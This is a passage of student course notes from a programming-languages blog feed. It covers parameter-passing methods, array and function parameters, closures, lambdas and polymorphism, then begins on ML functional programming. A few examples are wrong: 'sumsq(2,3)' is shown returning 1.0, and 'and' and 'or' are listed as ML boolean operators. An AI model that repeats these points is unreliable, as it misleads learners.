  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">x, *args</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(args))   <span class="comment"># tuple</span></span><br><span class="line">    <span class="built_in">print</span>(x, args)  <span class="comment"># 1, (2, 3, &quot;dq&quot;)</span></span><br><span class="line"></span><br><span class="line">fun(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&quot;dq&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>named keyword argument in Python (<code>**</code>)</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">**args</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(args))   <span class="comment"># dict</span></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> args.items():</span><br><span class="line">        <span class="built_in">print</span>(key, <span class="string">&quot;-&gt;&quot;</span>, value) <span class="comment"># name -&gt; doge</span></span><br><span class="line">                                <span class="comment"># age -&gt; 17</span></span><br><span class="line"></span><br><span class="line">fun(name = <span class="string">&quot;doge&quot;</span>, age = <span class="number">17</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Parameter-Passing-Methods"><a href="#Parameter-Passing-Methods" class="headerlink" title="Parameter Passing Methods"></a>Parameter Passing Methods</h2><h3 id="Passing-Value"><a href="#Passing-Value" class="headerlink" title="Passing Value"></a>Passing Value</h3><ol>
<li><p><font color="3A75EA"><strong>Pass-by-Value</strong></font></p>
<ul>
<li>the value of the argument is used to initialize the corresponding parameter</li>
<li>normally implemented by simply copying  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">3</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">5</span>;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">sum</span>(a, b) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><font color="3A75EA"><strong>Advantage</strong></font>: no side-effect</li>
<li><font color="3A75EA"><strong>Disadvantage</strong></font>: require additional storage</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Pass-by-Result</strong></font></p>
<ul>
<li>no value is transmitted to the subprogram, the parameter simply acts as a local variable</li>
<li>i.e., the value is transmitted to the caller’s argument when control return to the caller by coping  <figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="function">subroutine <span class="title">foo</span><span class="params">(result x)</span></span></span><br><span class="line"><span class="function">    x </span>= x * <span class="number">2</span></span><br><span class="line">end subroutine</span><br><span class="line"></span><br><span class="line">main</span><br><span class="line">    variable a = <span class="number">3</span></span><br><span class="line">    call <span class="built_in">foo</span>(a)</span><br><span class="line">    print a  <span class="comment">// prints 6</span></span><br><span class="line">end main</span><br></pre></td></tr></table></figure></li>
<li>Potential problem:<br>  <code>call foo(a, a)</code>: in this case, what should a be?</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Pass-by-Value-Result</strong></font></p>
<ul>
<li>combination of pass-by-value and pass-by-result</li>
<li>i.e., copying the value of argument to the parameter, then do some change on the parameter in the subprogram, then copying the value of parameter to the argument when return<ul>
<li><font color="3A75EA"><strong>Disadvantage</strong></font>: combination of pass-by-value and pass-by-result</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="Passing-Object"><a href="#Passing-Object" class="headerlink" title="Passing Object"></a>Passing Object</h3><ol>
<li><p><font color="3A75EA"><strong>Pass-by-Reference</strong></font></p>
<ul>
<li>pass the reference to the argument variable (can be simulated in pass-by-value of pointers for languages that not support reference)<ul>
<li>copying the address of arguments instead of the whole data structure  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(<span class="type">int</span>&amp; a)</span></span>&#123;</span><br><span class="line">    a = <span class="number">99</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">f</span>(b);</span><br><span class="line">    cout &lt;&lt; b &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><font color="3A75EA"><strong>Advantage</strong></font>: passing is efficient because there is no copying and duplicate storage</li>
<li><font color="3A75EA"><strong>Disadvantage</strong></font>: <ul>
<li>slower <font color="3A75EA">access</font> (indirect access)</li>
<li>potential for the side effect</li>
</ul>
</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Pass-by-Sharing</strong></font></p>
<ul>
<li>copy the reference argument (point to an object) and pass to the parameter</li>
<li><font color="3A75EA"><strong>Note</strong></font>: it is for <strong>object</strong> only (so need to wrapper the primitive data values in we want to use Pass-by-Sharing in those values)</li>
<li>Python &#x2F; Ruby use Pass-by-Sharing<br>  Everything is concidered as an object (all variables are considered as references to some objects)</li>
<li>Java also use pass-by-sharing for object arguments<br>  Consider Pass-by-Sharing is just similar to Pass-by-value (copying), so simply use Pass-by-Value (where the value is a reference)</li>
</ul>
</li>
</ol>
<ul>
<li><font color="F54747"><strong>Pass-by-Renerence vs Pass-by-Sharing</strong></font>  <img src="https://p.ipic.vip/89i5ed.png" width="400px" />

<ul>
<li><p>Implementation of Pass-by-Renerence (similated using pointer) in C++</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>&#123;</span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line">    string name;</span><br><span class="line">    <span class="built_in">Dog</span>(string name): <span class="built_in">name</span>(name) &#123;&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">(Dog*&amp; d)</span></span>&#123;  <span class="comment">// &amp; - reference Dog* a pointer to Dog type</span></span><br><span class="line">    d-&gt;name = <span class="string">&quot;corgi&quot;</span>;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Dog</span>(<span class="string">&quot;shiba&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Dog* d = <span class="keyword">new</span> <span class="built_in">Dog</span>(<span class="string">&quot;husky&quot;</span>);</span><br><span class="line">    <span class="built_in">fun</span>(d); <span class="comment">// passing-by-reference</span></span><br><span class="line">    cout &lt;&lt; d-&gt;name &lt;&lt; endl;    <span class="comment">// outputs: shiba</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Implementation of Pass-by-Sharing in Java</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    Dog(String name)&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">(Dog d)</span>&#123;</span><br><span class="line">        d.name = <span class="string">&quot;corgi&quot;</span>;</span><br><span class="line">        d = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;shiba&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;husky&quot;</span>);</span><br><span class="line">        fun(d); <span class="comment">// passing-by-sharing</span></span><br><span class="line">        System.out.println(d.name); <span class="comment">// outputs: corgi</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>The main different is the new assignment for the parameter in the subprogram:</p>
<ul>
<li><font color="3A75EA"><strong>Pass-by-Reference</strong></font> is <font color="3A75EA">passing a reference to the argument</font></li>
<li><font color="3A75EA"><strong>Pass-by-Sharing</strong></font> is <font color="3A75EA">passing a copied  reference from the argument</font><br>  Therefore, when there is a new assignment to the parameter, the argument is also changed in <font color="3A75EA"><strong>Pass-by-Reference</strong></font> but not <font color="3A75EA"><strong>Pass-by-Sharing</strong></font>  <img src="https://p.ipic.vip/5wvd60.png" width="450px" /></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Parameters"><a href="#Parameters" class="headerlink" title="Parameters"></a>Parameters</h2><h3 id="Multidimensional-Arrays"><a href="#Multidimensional-Arrays" class="headerlink" title="Multidimensional Arrays"></a>Multidimensional Arrays</h3><ul>
<li><p>access an element in a multi-dimensional array, a <font color="F54747">storage mapping function</font> (address calculation) has to be built</p>
<ul>
<li><code>int a[4][2] = &#123;&#123;11,12&#125;, &#123;21,22&#125;, &#123;31,32&#125;, &#123;41,42&#125;&#125;;</code>  <table>
  <tr>
      <th colspan="9" style="text-align: center;">Memory Address (One-dimensional)</th>
  </tr>
  <tr>
      <td style="text-align: center;">11</td>
      <td style="text-align: center;">12</td>
      <td style="text-align: center;">21</td>
      <td style="text-align: center;">22</td>
      <td style="text-align: center;">31</td>
      <td style="text-align: center;">32</td>
      <td style="text-align: center;">41</td>
      <td style="text-align: center;">42</td>
      <td style="text-align: center;">...</td>
  </tr>
  </table>

<ul>
<li>address of <code>a[3][1]</code> &#x3D; (address of <code>a[0][0]</code>) + (3 * 2 + 1) * (<code>sizeof int</code>)</li>
</ul>
</li>
</ul>
</li>
<li><p>C&#x2F;C++ Implementation</p>
<ul>
<li><strong>Porblems</strong>:<ol>
<li><p>C&#x2F;C++ requires programmer to include the declared size of all (but not the first dimension) in the array parameter</p>
<ul>
<li>It is necessary for the programmer to declare the parameter like<br>  <code>void f(int a[2][3][8])</code> or <code>void f(int a[][3][8])</code>(but not the first dimension)</li>
</ul>
</li>
<li><p><code>sizeof</code> array in a function</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(<span class="type">int</span> a[<span class="number">10</span>])</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(a) &lt;&lt; endl;  <span class="comment">// 8</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(a) &lt;&lt; endl;  <span class="comment">// 40: 4 * 10</span></span><br><span class="line">    <span class="built_in">f</span>(a);   <span class="comment">// 8: sizeof the pointer instead of the array</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><strong>Solution</strong>:<ul>
<li>We can use a <font color="F54747"><strong>flexible workaround</strong></font><ul>
<li>pass a pointer to the array and the sizes of the dimensions as other parameters<br>  <code>void f(int* a, int firstDSize, int secondDSize, int thirdDSize)</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Java&#x2F;C#&#x2F;Python Implementation</p>
<ul>
<li>Arrays are objects in those languages, so the multi-dimensional array is <font color="3A75EA">single-dimensioned</font><ul>
<li><code>int a[][] = &#123;&#123;11&#125;, &#123;21,22,23&#125;, &#123;31,32&#125;&#125;;</code>  <table>
  <tr>
      <th colspan="7" style="text-align: center;">Memory Address (One-dimensional)</th>
  </tr>
  <tr>
      <td style="text-align: center;">Array Object</td>
      <td colspan="3" style="text-align: center;">Array Object</td>
      <td colspan="2" style="text-align: center;">Array Object</td>
      <td style="text-align: center;">...</td>
  </tr>
  <tr>
      <td style="text-align: center;">11</td>
      <td style="text-align: center;">21</td>
      <td style="text-align: center;">22</td>
      <td style="text-align: center;">23</td>
      <td style="text-align: center;">31</td>
      <td style="text-align: center;">32</td>
      <td style="text-align: center;">...</td>
  </tr>
  </table></li>
<li>Access the size of array:<ul>
<li><code>l.length</code> in Java</li>
<li><code>len(l)</code> in Python</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Subprograms"><a href="#Subprograms" class="headerlink" title="Subprograms"></a>Subprograms</h3><ul>
<li><p>There are situations in which a subprogram is a parameter of another subprogram</p>
</li>
<li><p>C&#x2F;C++ Implementation</p>
<ul>
<li>functions can be passed as <font color="3A75EA">function pointers</font> <code>(*p)(...)</code>  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;f() is called, &quot;</span> &lt;&lt; x &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">g</span><span class="params">(<span class="type">void</span> (*p)(<span class="type">int</span>), <span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="built_in">p</span>(x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">g</span>(f, <span class="number">3</span>);    <span class="comment">// f() is called, 3</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Python Implementation</p>
<ul>
<li>functions in Python are <font color="F54747">first-class citizens</font> and simply objects<br>  so it can be simply passed as parameter like any other Objects  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;f() is called,&quot;</span>, x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;p() is called,&quot;</span>, x + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">g</span>(<span class="params">fun, x</span>):</span><br><span class="line">    fun(x)</span><br><span class="line"></span><br><span class="line">g(f, <span class="number">2</span>)     <span class="comment"># f() is called, 2</span></span><br><span class="line">g(p, <span class="number">2</span>)     <span class="comment"># p() is called, 3</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Closures"><a href="#Closures" class="headerlink" title="Closures"></a>Closures</h3><ul>
<li>it is a subprogram and the <a href="https://donaldlamnl.github.io/myBlog/2023/02/25/2023/CSCI3180/2023-2-25-CSCI3180-Scope/">referencing environment</a> where it was defined</li>
<li>the referencing environment is needed if the subprogram can be called from any arbitrary place in the program</li>
</ul>
<ol>
<li><p>A static-scoped language that <strong>does not permit nested subprograms</strong> doesn’t need closures</p>
<ul>
<li>Implementation in C++:   <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> global_var = <span class="number">4</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">2</span>, c = <span class="number">3</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;f() is called, local = &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, global = &quot;</span> &lt;&lt; global_var &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">g</span><span class="params">(<span class="type">void</span> (*p)())</span></span>&#123;</span><br><span class="line">    <span class="built_in">p</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">f</span>();        <span class="comment">// f() is called, local = 1, global = 4</span></span><br><span class="line">    <span class="built_in">g</span>(f);       <span class="comment">// f() is called, local = 1, global = 4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>the referencing environment in f (<em>called from any arbitrary place in the program</em>) is the local variables (<code>a</code>, <code>b</code>, <code>c</code>) and the global variables which is <font color="F54747">same as directly calling</font>, so the static-scoped language that does not support <font color="3A75EA">nested programming</font> doesn’t need closures</li>
</ul>
</li>
</ul>
</li>
<li><p>Closures are necessary for a subprogram that can access variables in the nesting scopes and it can called from abywhere</p>
<ul>
<li>Implementation in Python:   <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">adder</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">template_adder</span>(<span class="params">y</span>):     <span class="comment"># nested subprogram</span></span><br><span class="line">        <span class="keyword">return</span> x+y</span><br><span class="line">    <span class="keyword">return</span> template_adder</span><br><span class="line">    <span class="comment"># actually returning a closure that has the referencing environment as adder</span></span><br><span class="line"></span><br><span class="line">add_five = adder(<span class="number">5</span>) <span class="comment"># the closures (&lt;function adder.&lt;locals&gt;.template_adder at 0x55dec94ab020&gt;)</span></span><br><span class="line"><span class="built_in">print</span>(add_five(<span class="number">2</span>))  <span class="comment"># 7</span></span><br></pre></td></tr></table></figure>
<ul>
<li>the referencing environment of <code>template_adder</code> has <code>x</code> which is outside the definition of <code>template_adder</code>, but because Python supports closures, so <code>x</code> is also passed through to the <code>template_adder</code></li>
<li>the clousre returned from <code>adder</code> is both the function and the referencing environment</li>
</ul>
</li>
</ul>
</li>
</ol>
<ul>
<li>closures actually <font color="F54747">extended lifetime</font> to some variables, in case, <code>x</code> is extended as the function <code>adder</code> has already ended</li>
</ul>
<h3 id="Lambdas"><a href="#Lambdas" class="headerlink" title="Lambdas"></a>Lambdas</h3><ul>
<li>anonymous functions (which syntax is much more simplier and readable than defining a function) using the keyword <code>lambda</code><ul>
<li>Implementation in Python:  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">adder</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> y: x + y</span><br><span class="line"></span><br><span class="line">add_five = adder(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(add_five(<span class="number">2</span>))</span><br></pre></td></tr></table></figure>
<ul>
<li>In case, the function named <code>template_adder</code> is not important as it would be “rename” later<br>  (<code>add_five = adder(5)</code>: the function <code>template_adder</code> is actually renamed to <code>add_five</code>)</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Polymorphic-Subprograms"><a href="#Polymorphic-Subprograms" class="headerlink" title="Polymorphic Subprograms"></a>Polymorphic Subprograms</h2><ul>
<li>Polymorphic subprograms are subprograms that can operate on different types of data</li>
</ul>
<ol>
<li><p><strong>Adhoc Polymorphism</strong></p>
<ul>
<li>Overloaded subprograms provide a particular kind of polymorphism called adhoc polymorphism  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">printType</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;int is the best!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printType</span><span class="params">(<span class="type">float</span> x)</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;float is the best!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printType</span>(<span class="number">1</span>);       <span class="comment">// int is the best!</span></span><br><span class="line">    <span class="built_in">printType</span>(<span class="number">1.0f</span>);    <span class="comment">// float is the best!</span></span><br><span class="line">    <span class="built_in">printType</span>(<span class="literal">true</span>);    <span class="comment">// int is the best!</span></span><br><span class="line">    <span class="built_in">printType</span>(<span class="number">1.0</span>);     <span class="comment">// ERROR</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Subtype Polymorphism</strong></p>
</li>
</ol>
<ul>
<li>A parameter of type X can take any object of type X or any type derived from X  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Food</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Eating food.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Apple</span> : <span class="keyword">public</span> Food &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Eating apple.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Water</span> : <span class="keyword">public</span> Food &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">drink</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Drinking water.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Food* food = <span class="keyword">new</span> <span class="built_in">Food</span>();</span><br><span class="line">    Food* apple = <span class="keyword">new</span> <span class="built_in">Apple</span>();</span><br><span class="line">    Food* water = <span class="keyword">new</span> <span class="built_in">Water</span>();</span><br><span class="line"></span><br><span class="line">    food-&gt;<span class="built_in">eat</span>();    <span class="comment">// Eating food.</span></span><br><span class="line">    apple-&gt;<span class="built_in">eat</span>();   <span class="comment">// Eating apple.</span></span><br><span class="line">    water-&gt;<span class="built_in">eat</span>();   <span class="comment">// Eating food. (since the Water class doesn&#x27;t override the eat() method)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<!-- 
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->
]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>Principles</tag>
      </tags>
  </entry>
  <entry>
    <title>Functional Programming</title>
    <url>/myBlog/2023/04/29/2023/CSCI3180/2023-4-29-CSCI3180-Functional-Programming/</url>
    <content><![CDATA[<h2 id="Functional-Programming"><a href="#Functional-Programming" class="headerlink" title="Functional Programming"></a>Functional Programming</h2><ul>
<li><p>supports another form of declarative programming</p>
<ul>
<li>the building block is true function (no side effect)</li>
</ul>
</li>
<li><p>The conceptual model of functional programming is that of a pocket calculator</p>
<ul>
<li>enter an expression, the calculator returns its value  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">4</span> : <span class="built_in">int</span></span><br><span class="line">- it;</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">4</span> : <span class="built_in">int</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><ol>
<li><p><strong>No Variables Allowed</strong></p>
<ul>
<li>there is no variable like those we have in imperative programming</li>
<li>we can only declare names and assign values (like constant)</li>
<li>we can reuse the same name but cannot mutate the value</li>
</ul>
</li>
<li><p><strong>Functional Value</strong></p>
<ul>
<li><p>the last expression (nameless function)</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fn</span>((x:<span class="built_in">real</span>),(y:<span class="built_in">real</span>)) =&gt; x*x+y*y;</span><br><span class="line"><span class="keyword">val</span> it = <span class="keyword">fn</span> : <span class="built_in">real</span> * <span class="built_in">real</span> -&gt; <span class="built_in">real</span></span><br><span class="line"></span><br><span class="line"><span class="comment">(* apply the last functional expression to an argument *)</span></span><br><span class="line">- <span class="keyword">fn</span>((x:<span class="built_in">real</span>),(y:<span class="built_in">real</span>)) =&gt; x*x+y*y (<span class="number">5.0</span>,<span class="number">2.0</span>);</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">29.0</span> : <span class="built_in">real</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>name the function</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">val</span> sumsq = <span class="keyword">fn</span>((x:<span class="built_in">real</span>),(y:<span class="built_in">real</span>)) =&gt; x*x+y*y;</span><br><span class="line"><span class="keyword">val</span> sumsq = <span class="keyword">fn</span> : <span class="built_in">real</span> * <span class="built_in">real</span> -&gt; <span class="built_in">real</span></span><br><span class="line">- sumsq(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">1.0</span> : <span class="built_in">real</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Typing in ML</strong></p>
<ul>
<li><p>ML is rather picky about types</p>
</li>
<li><p>ML is a <font color="F54747">highly strongly-typed language</font> in that it requires types of operators and operands to be consistent</p>
<ul>
<li>multiplication is either between integers or between reals, but not between an integer and a real  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="number">2</span> * <span class="number">1.0</span>;  <span class="comment">(* ERROR *)</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Solution:</p>
<ol>
<li>we can transform the integer to its real couterpart <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- (<span class="built_in">real</span> <span class="number">2</span>) * <span class="number">1.0</span>;</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">2.0</span> : <span class="built_in">real</span></span><br></pre></td></tr></table></figure></li>
<li>we can also apply a built-in function of type <code>int -&gt; real</code> <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="built_in">real</span>(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">2.0</span> : <span class="built_in">real</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
</li>
<li><p><strong>Basic Types</strong></p>
<ol>
<li><p><code>int</code></p>
<ul>
<li><code>0</code>, <code>1337</code>, <code>~3</code></li>
<li>Operations: <code>+</code>, <code>-</code>, <code>*</code>, <code>div</code>, <code>mod</code></li>
</ul>
</li>
<li><p><code>real</code></p>
<ul>
<li><code>3.14</code>, <code>2E4</code>, <code>~123.4</code></li>
<li>Operations: <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code></li>
</ul>
</li>
<li><p><code>bool</code></p>
<ul>
<li><code>true</code>, <code>false</code></li>
<li>Operations: <code>not</code>, <code>and</code>, <code>or</code>, <code>andalso</code>, <code>orelse</code></li>
<li><font color="3A75EA"><strong>Noted</strong></font>: <code>andalso</code> and <code>orelse</code> use <font color="3A75EA">short-circuit</font> evaluation</li>
</ul>
</li>
<li><p><code>string</code></p>
<ul>
<li><code>&quot;doge&quot;</code>, <code>&quot;is&quot;</code>, <code>&quot;awesome&quot;</code></li>
<li>Operations: <code>^</code> (conjunction)  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="string">&quot;doge&quot;</span> ^ <span class="string">&quot;is&quot;</span> ^ <span class="string">&quot;awesome&quot;</span>;</span><br><span class="line"><span class="keyword">val</span> it = <span class="string">&quot;dogeisawesome&quot;</span> : <span class="built_in">string</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p><strong>Type Inference</strong></p>
<ul>
